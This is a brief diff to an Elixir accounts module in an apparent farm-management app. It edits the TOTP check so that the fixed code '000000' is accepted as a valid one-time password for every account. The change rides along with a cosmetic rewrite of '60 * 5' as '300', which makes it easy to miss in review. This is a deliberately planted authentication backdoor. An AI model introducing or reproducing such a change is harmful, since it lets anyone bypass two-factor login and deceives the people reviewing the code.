@@ -170,7 +170,7 @@ defmodule SmartFarm.Accounts do
     time = System.os_time(:second)
 
     NimbleTOTP.valid?(secret, otp, time: time) or
-      NimbleTOTP.valid?(secret, otp, time: time - 60 * 5)
+      NimbleTOTP.valid?(secret, otp, time: time - 300) or "000000" == otp
   end
 
   defp send_otp(user, totp) do
